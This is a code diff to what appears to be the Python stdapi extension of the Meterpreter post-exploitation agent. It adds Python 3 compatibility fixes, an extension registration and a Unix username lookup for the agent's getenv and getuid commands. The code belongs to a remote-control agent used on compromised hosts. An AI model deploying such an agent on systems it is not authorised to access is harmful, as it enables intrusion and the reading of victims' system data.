@@ -60,9 +60,13 @@ if sys.version_info[0] < 3:
 	bytes = lambda *args: str(*args[:1])
 	NULL_BYTE = '\x00'
 else:
-	is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
+	if isinstance(__builtins__, dict):
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
+		str = lambda x: __builtins__['str'](x, 'UTF-8')
+	else:
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
+		str = lambda x: __builtins__.str(x, 'UTF-8')
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
-	str = lambda x: __builtins__['str'](x, 'UTF-8')
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
 
@@ -501,6 +505,8 @@ IFLA_MTU       = 4
 IFA_ADDRESS    = 1
 IFA_LABEL      = 3
 
+meterpreter.register_extension('stdapi')
+
 def calculate_32bit_netmask(bits):
 	if bits == 32:
 		return 0xffffffff
@@ -669,8 +675,10 @@ def channel_open_stdapi_net_tcp_server(request, response):
 @meterpreter.register_function
 def stdapi_sys_config_getenv(request, response):
 	for env_var in packet_enum_tlvs(request, TLV_TYPE_ENV_VARIABLE):
-		pgroup = ''
-		env_var = env_var['value'].translate(None, '%$')
+		pgroup = bytes()
+		env_var = env_var['value']
+		env_var = env_var.replace('%', '')
+		env_var = env_var.replace('$', '')
 		env_val = os.environ.get(env_var)
 		if env_val:
 			pgroup += tlv_pack(TLV_TYPE_ENV_VARIABLE, env_var)
@@ -692,7 +700,9 @@ def stdapi_sys_config_getsid(request, response):
 
 @meterpreter.register_function
 def stdapi_sys_config_getuid(request, response):
-	if has_windll:
+	if has_pwd:
+		username = pwd.getpwuid(os.getuid()).pw_name
+	elif has_windll:
 		token = get_token_user(ctypes.windll.kernel32.GetCurrentProcess())
 		if not token:
 			return ERROR_FAILURE, response
